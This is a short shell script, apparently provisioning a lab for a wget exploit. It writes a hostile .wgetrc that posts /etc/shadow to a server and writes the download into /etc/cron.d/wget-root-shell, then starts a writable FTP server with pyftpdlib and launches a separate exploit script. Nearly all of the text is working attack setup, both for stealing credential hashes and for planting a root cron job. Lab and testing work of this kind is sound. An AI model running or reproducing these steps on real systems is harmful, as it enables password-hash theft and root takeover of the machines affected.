
mkdir /tmp/ftptest
cd /tmp/ftptest
cat <<_EOF_>>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_

sudo dnf install -y pyftpdlib

sudo python -m pyftpdlib -p21 -w &
sleep 5
sudo python /vagrant/provision/wget-exploit.sh &
